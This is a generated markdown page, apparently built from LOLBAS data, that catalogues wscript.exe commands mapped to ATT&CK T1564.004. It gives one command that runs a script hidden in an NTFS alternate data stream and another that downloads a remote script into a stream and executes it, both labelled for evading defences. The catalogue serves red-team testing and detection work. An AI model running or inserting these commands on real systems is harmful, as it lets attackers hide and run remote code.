---
parsed_by: focuslocust
source: commands
type: generated
---
# Wscript Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Wscript.exe

Tool page: [Wscript.exe](../../tools/windows/wscript.exe.md)

### Execute hidden code to evade defensive counter measures

```text
wscript //e:vbscript {PATH}:script.vbs
```

Description:

Execute script stored in an alternate data stream

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wscript.yml` |
| Evidence | Command preserved from source parser. |

### Execute hidden code to evade defensive counter measures

```text
echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
```

Description:

Download and execute script stored in an alternate data stream

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wscript.yml` |
| Evidence | Command preserved from source parser. |
